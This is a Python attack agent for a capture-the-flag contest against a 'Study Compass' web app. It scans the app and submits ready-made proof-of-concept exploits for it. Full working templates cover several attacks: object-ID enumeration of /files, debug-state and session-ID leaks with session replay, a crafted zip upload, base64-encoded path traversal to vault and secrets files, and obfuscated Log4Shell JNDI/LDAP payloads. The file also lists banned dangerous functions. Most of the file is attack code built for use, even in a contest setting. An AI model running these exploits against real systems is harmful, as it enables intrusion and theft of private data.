"""
Attack agent (team2) for Study Compass-style targets.

Current submission contract in local helper/docs is still 4 vulnerabilities.
So vuln5/vuln6 support is implemented as extra slots/templates, but default
submission target remains vuln1~vuln4 unless ATTACK_FLAG_IDS is overridden.
"""
from __future__ import annotations

import ast
import base64
import io
import json
import os
import random
import re
import sys
import time
from collections import deque
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any
from urllib.error import HTTPError, URLError
from urllib.parse import urlencode
from urllib.request import Request, urlopen

try:
    import httpx
except ImportError:
    httpx = None


ALLOWED_MODELS = [
    "openai/gpt-4o-mini",
    "google/gemini-flash-1.5",
    "google/gemini-2.0-flash-001",
    "qwen/qwen-2.5-14b",
    "mistralai/mistral-small-3.1",
    "microsoft/phi-4",
    "xiaomi/mimo",
]

LLM_RPM = 25
ATTACK_RPM = 18
POCS_RPM = 10

MAX_LLM_CALLS = 8
MAX_ATTACK_TURNS = 10
MAX_POC_SUBMITS = 4
WALL_TIME_BUDGET = 25 * 60

FLAG_RE = re.compile(r"\bHSPACE\{[^}\r\n]{1,200}\}")
SESSION_RE = re.compile(
    r"\b[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\b",
    re.I,
)

DEFAULT_FLAG_IDS = ("vuln1", "vuln2", "vuln3", "vuln4")
EXTRA_FLAG_IDS = ("vuln5", "vuln6")

POC_BANNED_PATTERNS = (
    "subprocess", "os.system", "os.popen", "eval(", "exec(",
    "__import__", "ctypes", "pickle.loads", "shutil.rmtree",
)
POC_ALLOWED_IMPORTS = {
    "os", "sys", "re", "json", "io", "time", "base64",
    "urllib", "http", "socket", "ssl", "hashlib",
    "string", "binascii", "struct", "html",
    "collections", "itertools", "functools",
    "typing", "dataclasses", "datetime", "math", "random",
    "uuid", "zipfile",
}
POC_MAX_BYTES = 60 * 1024

SAFE_BASE_PROBES = [
    {"path": "/openapi.json", "method": "GET"},
    {"path": "/debug/state", "method": "GET"},
    {"path": "/debug/state", "method": "GET", "query": {"verbose": "true"}},
    {"path": "/files", "method": "GET"},
    {"path": "/files/1", "method": "GET"},
    {"path": "/files/2", "method": "GET"},
    {"path": "/files/10", "method": "GET"},
    {"path": "/files/38", "method": "GET"},
    {"path": "/files/41", "method": "GET"},
    {"path": "/files/80", "method": "GET"},
    {"path": "/analysis", "method": "GET", "query": {"include_meta": "true"}},
    {"path": "/recommend", "method": "GET", "query": {"expand": "true"}},
    {"path": "/recommend", "method": "GET", "query": {"expand": "history"}},
]


def _configured_flag_ids() -> tuple[str, ...]:
    raw = os.environ.get("ATTACK_FLAG_IDS", "")
    if not raw.strip():
        return DEFAULT_FLAG_IDS
    values = tuple(item.strip() for item in raw.split(",") if item.strip())
    return values or DEFAULT_FLAG_IDS


def _load_build_rev() -> str:
    manifest_path = Path(__file__).resolve().parents[1] / "agent_manifest.json"
    try:
        data = json.loads(manifest_path.read_text(encoding="utf-8"))
        revision = str(data.get("revision", "")).strip()
        if revision:
            return revision
    except Exception:
        pass
    return "unknown-build-rev"


BUILD_REV = _load_build_rev()
FLAG_IDS = _configured_flag_ids()


@dataclass(frozen=True)
class AgentEnv:
    team_id: str
    target_team: str
    round_num: int
    run_id: str
    run_token: str
    openrouter_base_url: str
    agent_base_url: str

    @classmethod
    def from_env(cls) -> "AgentEnv":
        return cls(
            team_id=os.environ.get("TEAM_ID", "unknown"),
            target_team=os.environ.get("TARGET_TEAM", ""),
            round_num=int(os.environ.get("ROUND") or "0"),
            run_id=os.environ.get("AGENT_RUN_ID", ""),
            run_token=os.environ.get("AGENT_RUN_TOKEN", ""),
            openrouter_base_url=(
                os.environ.get("OPENROUTER_BASE_URL")
                or os.environ.get("OPENAI_BASE_URL")
                or ""
            ).rstrip("/"),
            agent_base_url=os.environ.get("HSPACE_AGENT_BASE_URL", "").rstrip("/"),
        )

    @property
    def auth(self) -> dict[str, str]:
        return {"Authorization": f"Bearer {self.run_token}"} if self.run_token else {}


class RateLimiter:
    def __init__(self, name: str, rpm: int):
        self.name = name
        self.rpm = rpm
        self.times: deque[float] = deque()

    def acquire(self) -> None:
        now = time.time()
        while self.times and now - self.times[0] > 60.0:
            self.times.popleft()
        if len(self.times) >= self.rpm:
            wait = 60.0 - (now - self.times[0]) + 0.5
            print(f"  [rl] {self.name} {self.rpm}/min, sleep {wait:.1f}s", file=sys.stderr)
            time.sleep(max(wait, 1.0))
            return self.acquire()
        self.times.append(now)


_LIMITERS = {
    "llm": RateLimiter("llm", LLM_RPM),
    "attack": RateLimiter("attack", ATTACK_RPM),
    "pocs": RateLimiter("pocs", POCS_RPM),
}


@dataclass
class Budget:
    start_time: float = field(default_factory=time.time)
    llm_calls: int = 0
    attack_turns: int = 0
    poc_submits: int = 0

    @property
    def time_left(self) -> float:
        return WALL_TIME_BUDGET - (time.time() - self.start_time)

    def can_llm(self) -> bool:
        return self.llm_calls < MAX_LLM_CALLS and self.time_left > 30

    def can_attack(self) -> bool:
        return self.attack_turns < MAX_ATTACK_TURNS and self.time_left > 20

    def can_poc(self) -> bool:
        return self.poc_submits < MAX_POC_SUBMITS and self.time_left > 15

    def report(self) -> str:
        return (
            f"llm={self.llm_calls}/{MAX_LLM_CALLS} "
            f"atk={self.attack_turns}/{MAX_ATTACK_TURNS} "
            f"poc={self.poc_submits}/{MAX_POC_SUBMITS} "
            f"t={int(self.time_left)}s"
        )


@dataclass
class LLMState:
    failures: dict[str, int] = field(default_factory=dict)

    def usable(self) -> list[str]:
        return [model for model in ALLOWED_MODELS if self.failures.get(model, 0) < 3]


class _CompatResp:
    def __init__(self, status: int, headers: dict[str, str], content: bytes):
        self.status_code = status
        self.headers = headers
        self.content = content
        self.text = content.decode("utf-8", errors="replace")

    def json(self) -> Any:
        return json.loads(self.text)


def _do_get(url: str, *, headers=None, timeout=30.0):
    if httpx is not None:
        return httpx.get(url, headers=headers, timeout=timeout)
    req = Request(url, headers=headers or {}, method="GET")
    try:
        with urlopen(req, timeout=timeout) as resp:
            return _CompatResp(resp.status, dict(resp.headers), resp.read())
    except HTTPError as exc:
        return _CompatResp(exc.code, dict(exc.headers), exc.read())


def _do_post(url: str, *, headers=None, json_body=None, data=None, timeout=30.0):
    if httpx is not None:
        return httpx.post(url, headers=headers, json=json_body, data=data, timeout=timeout)
    h = dict(headers or {})
    body: bytes | None = None
    if json_body is not None:
        body = json.dumps(json_body).encode("utf-8")
        h.setdefault("Content-Type", "application/json")
    elif isinstance(data, dict):
        body = urlencode(data).encode("utf-8")
        h.setdefault("Content-Type", "application/x-www-form-urlencoded")
    elif isinstance(data, str):
        body = data.encode("utf-8")
    elif isinstance(data, (bytes, bytearray)):
        body = bytes(data)
    req = Request(url, data=body, headers=h, method="POST")
    try:
        with urlopen(req, timeout=timeout) as resp:
            return _CompatResp(resp.status, dict(resp.headers), resp.read())
    except HTTPError as exc:
        return _CompatResp(exc.code, dict(exc.headers), exc.read())


def _request_with_backoff(method: str, url: str, *, max_retries=3, **kwargs):
    delay = 2.0
    last = None
    for attempt in range(max_retries):
        try:
            resp = _do_get(url, **kwargs) if method == "GET" else _do_post(url, **kwargs)
        except Exception as exc:
            if attempt == max_retries - 1:
                raise
            print(f"  network: {exc}", file=sys.stderr)
            time.sleep(delay + random.uniform(0, 1))
            delay = min(delay * 2, 15)
            continue
        last = resp
        if resp.status_code in (429, 502, 503, 504) and attempt < max_retries - 1:
            retry_after = resp.headers.get("Retry-After")
            wait = float(retry_after) if retry_after and retry_after.isdigit() else delay
            wait += random.uniform(0, 1)
            print(
                f"  HTTP {resp.status_code} backoff {wait:.1f}s "
                f"({attempt + 1}/{max_retries})",
                file=sys.stderr,
            )
            time.sleep(wait)
            delay = min(delay * 2, 15)
            continue
        return resp
    return last


def _text_of(obj: Any) -> str:
    if obj is None:
        return ""
    if isinstance(obj, bytes):
        return obj.decode("utf-8", "replace")
    if isinstance(obj, str):
        return obj
    try:
        return json.dumps(obj, ensure_ascii=False, sort_keys=True)
    except Exception:
        return str(obj)


def extract_flags(obj: Any) -> list[str]:
    return list(dict.fromkeys(FLAG_RE.findall(_text_of(obj))))


def extract_sessions(obj: Any) -> list[str]:
    return list(dict.fromkeys(SESSION_RE.findall(_text_of(obj))))


def _extract_openapi_paths(obj: Any) -> set[str]:
    if not isinstance(obj, dict):
        return set()
    paths = obj.get("paths")
    if isinstance(paths, dict):
        return {str(path) for path in paths.keys()}
    return set()


def _normalize_attack_result(raw: Any) -> dict[str, Any]:
    body = raw
    status_code = None
    headers: dict[str, Any] = {}
    if isinstance(raw, dict):
        headers = raw.get("headers") if isinstance(raw.get("headers"), dict) else {}
        for key in ("body", "json", "response", "data", "result", "text"):
            if key in raw:
                body = raw[key]
                break
        for key in ("status_code", "status", "code", "http_status"):
            value = raw.get(key)
            if isinstance(value, int):
                status_code = value
                break
    normalized = {
        "status_code": status_code,
        "headers": headers,
        "body": body,
        "text": _text_of(body),
        "raw": raw,
    }
    normalized["flags_found"] = extract_flags(raw)
    normalized["sessions_found"] = extract_sessions(raw)
    return normalized


def call_llm(
    env: AgentEnv,
    budget: Budget,
    llm_state: LLMState,
    *,
    purpose: str,
    messages: list[dict],
    max_tokens: int = 200,
    temperature: float = 0.2,
) -> tuple[int, str] | None:
    if not budget.can_llm():
        print(f"  [llm] budget exhausted for {purpose}", file=sys.stderr)
        return None
    if not env.openrouter_base_url or not env.run_token:
        print(f"  [llm] missing env for {purpose}", file=sys.stderr)
        return None

    for model in llm_state.usable():
        _LIMITERS["llm"].acquire()
        budget.llm_calls += 1
        try:
            resp = _request_with_backoff(
                "POST",
                f"{env.openrouter_base_url}/chat/completions",
                headers={
                    **env.auth,
                    "X-Agent-Purpose": purpose,
                    "Content-Type": "application/json",
                },
                json_body={
                    "model": model,
                    "messages": messages,
                    "temperature": temperature,
                    "max_tokens": max_tokens,
                },
                timeout=60.0,
            )
        except Exception as exc:
            print(f"  [llm:{model}] error: {exc}", file=sys.stderr)
            llm_state.failures[model] = llm_state.failures.get(model, 0) + 1
            continue

        if resp.status_code >= 400:
            print(f"  [llm:{model}] HTTP {resp.status_code}: {resp.text[:150]}", file=sys.stderr)
            llm_state.failures[model] = llm_state.failures.get(model, 0) + 1
            continue

        try:
            data = resp.json()
        except Exception:
            llm_state.failures[model] = llm_state.failures.get(model, 0) + 1
            continue

        call_id = (
            resp.headers.get("X-LLM-Call-ID")
            or resp.headers.get("x-llm-call-id")
            or (data.get("hspace") or {}).get("llm_call_id")
            or data.get("llm_call_id")
        )
        if not call_id:
            print(f"  [llm:{model}] no call_id", file=sys.stderr)
            llm_state.failures[model] = llm_state.failures.get(model, 0) + 1
            continue

        content = ((data.get("choices") or [{}])[0].get("message") or {}).get("content") or ""
        print(f"  [llm:{model}] ok call_id={call_id} ({purpose})", file=sys.stderr)
        try:
            return int(call_id), content
        except (TypeError, ValueError):
            return hash(str(call_id)) & 0x7FFFFFFF, content

    print(f"  [llm] all models exhausted for {purpose}", file=sys.stderr)
    return None


def finish(env: AgentEnv, status: str, error: str = "") -> None:
    if not env.agent_base_url:
        return
    try:
        _do_post(
            f"{env.agent_base_url}/finish",
            headers=env.auth,
            json_body={"status": status, "error": error},
            timeout=10.0,
        )
    except Exception as exc:
        print(f"finish failed: {exc}", file=sys.stderr)


def attack_target(env: AgentEnv, budget: Budget, probe: dict[str, Any], llm_call_id: int) -> dict[str, Any] | None:
    if not budget.can_attack():
        return None
    _LIMITERS["attack"].acquire()
    budget.attack_turns += 1

    try:
        resp = _request_with_backoff(
            "POST",
            f"{env.agent_base_url}/attack",
            headers=env.auth,
            json_body={
                "llm_call_id": llm_call_id,
                "payload": probe.get("payload") or "",
                "path": probe.get("path"),
                "method": (probe.get("method") or "GET").upper(),
                "json_body": probe.get("json_body"),
                "query": probe.get("query"),
                "headers": probe.get("headers"),
                "data": probe.get("data"),
            },
            timeout=40.0,
        )
    except Exception as exc:
        print(f"  [attack] error: {exc}", file=sys.stderr)
        return None

    if resp.status_code >= 400:
        print(f"  [attack] HTTP {resp.status_code}: {resp.text[:150]}", file=sys.stderr)
        return None

    try:
        payload = resp.json()
    except Exception:
        payload = {"status_code": resp.status_code, "text": resp.text}
    return _normalize_attack_result(payload)


def submit_poc(env: AgentEnv, budget: Budget, *, flag_id: str, llm_call_id: int, source: str) -> dict[str, Any] | None:
    if not budget.can_poc():
        return None
    try:
        _validate_poc(source)
    except ValueError as exc:
        print(f"  [pocs] {flag_id} validation: {exc}", file=sys.stderr)
        return None

    _LIMITERS["pocs"].acquire()
    budget.poc_submits += 1

    try:
        resp = _request_with_backoff(
            "POST",
            f"{env.agent_base_url}/pocs",
            headers=env.auth,
            data={
                "flag_id": flag_id,
                "llm_call_id": str(llm_call_id),
                "source": source,
            },
            timeout=30.0,
        )
    except Exception as exc:
        print(f"  [pocs] error: {exc}", file=sys.stderr)
        return None

    if resp.status_code >= 400:
        print(f"  [pocs] HTTP {resp.status_code}: {resp.text[:150]}", file=sys.stderr)
        return None
    try:
        return resp.json()
    except Exception:
        return {"status": "submitted"}


def _validate_poc(source: str) -> None:
    size = len(source.encode("utf-8"))
    if size > POC_MAX_BYTES:
        raise ValueError(f"too large: {size}")
    if size < 80:
        raise ValueError("too short")
    low = source.lower()
    for pattern in POC_BANNED_PATTERNS:
        if pattern in low:
            raise ValueError(f"banned: {pattern!r}")
    if "TARGET_HOST" not in source or "TARGET_PORT" not in source:
        raise ValueError("missing TARGET_HOST/TARGET_PORT")
    if "HSPACE" not in source:
        raise ValueError("missing HSPACE")
    hard = re.search(r"HSPACE\{[A-Za-z0-9_+/=\-]{8,}\}", source)
    if hard:
        raise ValueError(f"hardcoded: {hard.group(0)[:40]}")

    try:
        tree = ast.parse(source)
    except SyntaxError as exc:
        raise ValueError(f"syntax: line {exc.lineno}: {exc.msg}")

    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                top = alias.name.split(".")[0]
                if top not in POC_ALLOWED_IMPORTS:
                    raise ValueError(f"disallowed import: {alias.name}")
        elif isinstance(node, ast.ImportFrom):
            if node.level > 0:
                raise ValueError("relative import")
            top = (node.module or "").split(".")[0]
            if top and top not in POC_ALLOWED_IMPORTS:
                raise ValueError(f"disallowed: from {node.module}")
    compile(source, "<poc>", "exec")


def _extra_probes_from_paths(paths: set[str]) -> list[dict[str, Any]]:
    probes: list[dict[str, Any]] = []
    if "/api/cli/complete" in paths:
        candidates = [
            "vault/round12.txt",
            "secrets/round12",
            "cache/round12",
            "audit/round12",
            "lookup/round12",
        ]
        for candidate in candidates:
            b64 = base64.b64encode(candidate.encode("utf-8")).decode("ascii")
            probes.append({
                "path": "/api/cli/complete",
                "method": "POST",
                "json_body": {"path_b64": b64},
            })
    if "/api/log/preview" in paths:
        payloads = [
            "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://round12/a}",
            "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://flag/a}",
            "${jndi:ldap://round12/a}",
        ]
        for payload in payloads:
            for key in ("message", "text", "content", "template"):
                probes.append({
                    "path": "/api/log/preview",
                    "method": "POST",
                    "json_body": {key: payload},
                })
    return probes


def _followup_probes_from_sessions(sessions: list[str]) -> list[dict[str, Any]]:
    probes: list[dict[str, Any]] = []
    for sid in sessions[:5]:
        probes.extend([
            {"path": "/files", "method": "GET", "query": {"session_id": sid}},
            {"path": "/analysis", "method": "GET", "query": {"session_id": sid}},
            {
                "path": "/analysis",
                "method": "GET",
                "query": {"session_id": sid, "include_meta": "true"},
            },
            {"path": "/recommend", "method": "GET", "query": {"session_id": sid}},
            {
                "path": "/recommend",
                "method": "GET",
                "query": {"session_id": sid, "expand": "history"},
            },
        ])
    return probes


_POC_COMMON_HEADER = r'''
import base64
import io
import json
import os
import re
import sys
import uuid
import zipfile
from urllib.error import HTTPError, URLError
from urllib.parse import urlencode
from urllib.request import Request, urlopen

HOST = os.environ.get("TARGET_HOST", "127.0.0.1")
PORT = os.environ.get("TARGET_PORT", "80")
FLAG_ID = os.environ.get("FLAG_ID", "")
BASE = "http://%s:%s" % (HOST, PORT)
FLAG_RE = re.compile(r"\bHSPACE\{[^}\r\n]{1,200}\}")
SESSION_RE = re.compile(
    r"\b[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\b", re.I
)

def emit(flag):
    print(flag)
    raise SystemExit(0)

def text_of(obj):
    if obj is None:
        return ""
    if isinstance(obj, bytes):
        return obj.decode("utf-8", "replace")
    if isinstance(obj, str):
        return obj
    return json.dumps(obj, ensure_ascii=False, sort_keys=True)

def flags_in(obj):
    return list(dict.fromkeys(FLAG_RE.findall(text_of(obj))))

def sessions_in(obj):
    return list(dict.fromkeys(SESSION_RE.findall(text_of(obj))))[:80]

def request(method, path, params=None, data=None, headers=None, timeout=3):
    url = BASE.rstrip("/") + path
    if params:
        url += ("?" if "?" not in url else "&") + urlencode(params)
    req = Request(url, data=data, headers=headers or {}, method=method)
    try:
        with urlopen(req, timeout=timeout) as resp:
            raw = resp.read()
            ctype = resp.headers.get("content-type", "")
    except HTTPError as exc:
        try:
            raw = exc.read()
            ctype = exc.headers.get("content-type", "")
        except Exception:
            return None
    except (URLError, Exception):
        return None
    if "json" in ctype:
        try:
            return json.loads(raw.decode("utf-8", "replace"))
        except ValueError:
            return raw.decode("utf-8", "replace")
    return raw.decode("utf-8", "replace")

def try_emit(obj):
    found = flags_in(obj)
    if found:
        emit(found[0])
'''

_POC_VULN1 = _POC_COMMON_HEADER + r'''
def main():
    priority = [1, 2, 3, 4, 5, 10, 20, 33, 38, 39, 40, 41, 50, 80, 100, 150, 200]
    for fid in priority:
        try_emit(request("GET", "/files/%d" % fid))
    for fid in range(1, 151):
        if fid in priority:
            continue
        try_emit(request("GET", "/files/%d" % fid))
    try_emit(request("GET", "/files"))
    raise SystemExit(1)

if __name__ == "__main__":
    main()
'''

_POC_VULN2 = _POC_COMMON_HEADER + r'''
def main():
    targets = [
        ("/debug/state", None),
        ("/debug/state", {"verbose": "true"}),
        ("/openapi.json", None),
    ]
    for path, params in targets:
        try_emit(request("GET", path, params))
    raise SystemExit(1)

if __name__ == "__main__":
    main()
'''

_POC_VULN3 = _POC_COMMON_HEADER + r'''
def collect_sessions():
    sessions = []
    for path, params in [
        ("/debug/state", {"verbose": "true"}),
        ("/files", None),
        ("/analysis", {"include_meta": "true"}),
        ("/recommend", {"expand": "history"}),
        ("/openapi.json", None),
    ]:
        obj = request("GET", path, params)
        try_emit(obj)
        sessions += sessions_in(obj)
    for fid in [1, 10, 38, 80]:
        obj = request("GET", "/files/%d" % fid)
        try_emit(obj)
        sessions += sessions_in(obj)
    return list(dict.fromkeys(sessions))

def main():
    sessions = collect_sessions()
    if not sessions:
        raise SystemExit(1)
    for sid in sessions[:20]:
        for path, params in [
            ("/files", {"session_id": sid}),
            ("/analysis", {"session_id": sid}),
            ("/analysis", {"session_id": sid, "include_meta": "true"}),
            ("/recommend", {"session_id": sid}),
            ("/recommend", {"session_id": sid, "expand": "history"}),
        ]:
            try_emit(request("GET", path, params))
    raise SystemExit(1)

if __name__ == "__main__":
    main()
'''

_POC_VULN4 = _POC_COMMON_HEADER + r'''
def make_vault_zip():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("note.md", "# Probe\n\ntag: #ctf\n")
    return buf.getvalue()

def try_upload():
    boundary = "----hspace-" + uuid.uuid4().hex
    header_b = (
        "--%s\r\n"
        "Content-Disposition: form-data; name=\"file\"; filename=\"v.zip\"\r\n"
        "Content-Type: application/zip\r\n\r\n"
    ) % boundary
    data = header_b.encode() + make_vault_zip() + ("\r\n--%s--\r\n" % boundary).encode()
    obj = request(
        "POST",
        "/upload",
        data=data,
        headers={"Content-Type": "multipart/form-data; boundary=%s" % boundary},
        timeout=6,
    )
    try_emit(obj)
    return sessions_in(obj)

def main():
    sessions = try_upload()
    for path, params in [
        ("/debug/state", {"verbose": "true"}),
        ("/files", None),
        ("/analysis", {"include_meta": "true"}),
        ("/recommend", {"expand": "history"}),
        ("/files/1", None), ("/files/10", None), ("/files/38", None), ("/files/80", None),
    ]:
        try_emit(request("GET", path, params))
    for sid in sessions[:10]:
        for path in ("/files", "/analysis", "/recommend"):
            try_emit(request("GET", path, {"session_id": sid}))
    raise SystemExit(1)

if __name__ == "__main__":
    main()
'''

_POC_VULN5 = _POC_COMMON_HEADER + r'''
def main():
    suffixes = [
        "vault/round12.txt",
        "secrets/round12",
        "cache/round12",
        "audit/round12",
        "lookup/round12",
    ]
    for suffix in suffixes:
        payload = {"path_b64": base64.b64encode(suffix.encode()).decode()}
        obj = request(
            "POST",
            "/api/cli/complete",
            data=json.dumps(payload).encode(),
            headers={"Content-Type": "application/json"},
            timeout=4,
        )
        try_emit(obj)
    raise SystemExit(1)

if __name__ == "__main__":
    main()
'''

_POC_VULN6 = _POC_COMMON_HEADER + r'''
def main():
    payloads = [
        "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://round12/a}",
        "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://flag/a}",
        "${jndi:ldap://round12/a}",
    ]
    for payload in payloads:
        for key in ("message", "text", "content", "template"):
            obj = request(
                "POST",
                "/api/log/preview",
                data=json.dumps({key: payload}).encode(),
                headers={"Content-Type": "application/json"},
                timeout=4,
            )
            try_emit(obj)
    raise SystemExit(1)

if __name__ == "__main__":
    main()
'''

POC_BY_FLAG = {
    "vuln1": _POC_VULN1,
    "vuln2": _POC_VULN2,
    "vuln3": _POC_VULN3,
    "vuln4": _POC_VULN4,
    "vuln5": _POC_VULN5,
    "vuln6": _POC_VULN6,
}


def main() -> None:
    env = AgentEnv.from_env()
    budget = Budget()
    llm_state = LLMState()

    print(f"[attack_agent] build_rev={BUILD_REV}", file=sys.stderr, flush=True)
    print(
        f"[{env.team_id}] attack run={env.run_id} target={env.target_team} "
        f"round={env.round_num} build={BUILD_REV}",
        file=sys.stderr,
    )

    if not env.agent_base_url or not env.run_token:
        finish(env, "failed", "missing env")
        return

    try:
        warmup = call_llm(
            env,
            budget,
            llm_state,
            purpose="scan",
            messages=[
                {"role": "system", "content": "Acknowledge a CTF wrapper action. Reply: 'ok'."},
                {
                    "role": "user",
                    "content": f"Black-box recon of Study Compass on target {env.target_team}.",
                },
            ],
            max_tokens=10,
        )
        if warmup is None:
            print("  no LLM call_id -> /attack will fail", file=sys.stderr)
            finish(env, "failed", "no LLM call_id")
            return
        call_id, _ = warmup

        openapi_paths: set[str] = set()
        all_flags: set[str] = set()
        all_sessions: set[str] = set()
        history: list[dict[str, Any]] = []

        probe_queue = list(SAFE_BASE_PROBES)
        while probe_queue and budget.can_attack():
            probe = probe_queue.pop(0)
            result = attack_target(env, budget, probe, call_id)
            if result is None:
                continue

            flags = result["flags_found"]
            sessions = result["sessions_found"]
            all_flags.update(flags)
            all_sessions.update(sessions)
            history.append({"probe": probe, "result": result})

            print(
                f"  [{budget.report()}] {(probe.get('method') or 'GET').upper()} {probe.get('path')} "
                f"flags={len(flags)} sess={len(sessions)} status={result.get('status_code')}",
                file=sys.stderr,
            )

            if probe.get("path") == "/openapi.json":
                paths = _extract_openapi_paths(result["body"])
                new_paths = paths - openapi_paths
                openapi_paths.update(paths)
                if new_paths:
                    probe_queue.extend(_extra_probes_from_paths(openapi_paths))

        followups = _followup_probes_from_sessions(list(all_sessions))
        for probe in followups:
            if not budget.can_attack():
                break
            result = attack_target(env, budget, probe, call_id)
            if result is None:
                continue
            flags = result["flags_found"]
            sessions = result["sessions_found"]
            all_flags.update(flags)
            all_sessions.update(sessions)
            print(
                f"  [{budget.report()}] follow {probe.get('path')} "
                f"flags={len(flags)} sess={len(sessions)} status={result.get('status_code')}",
                file=sys.stderr,
            )

        print(
            f"  recon done: flags={len(all_flags)} sessions={len(all_sessions)} {budget.report()}",
            file=sys.stderr,
        )

        for flag_id in FLAG_IDS:
            if not budget.can_poc():
                break
            source = POC_BY_FLAG.get(flag_id)
            if not source:
                print(f"  [skip] no poc template for {flag_id}", file=sys.stderr)
                continue
            result = submit_poc(env, budget, flag_id=flag_id, llm_call_id=call_id, source=source)
            if result is not None:
                print(f"  [OK] submitted poc {flag_id} ({len(source)}B)", file=sys.stderr)
            else:
                print(f"  [!] submit failed {flag_id}", file=sys.stderr)

        print(f"  done: {budget.report()}", file=sys.stderr)
        finish(env, "completed")

    except Exception as exc:
        print(f"  fatal: {exc}", file=sys.stderr)
        finish(env, "failed", str(exc)[:300])
        raise


if __name__ == "__main__":
    main()
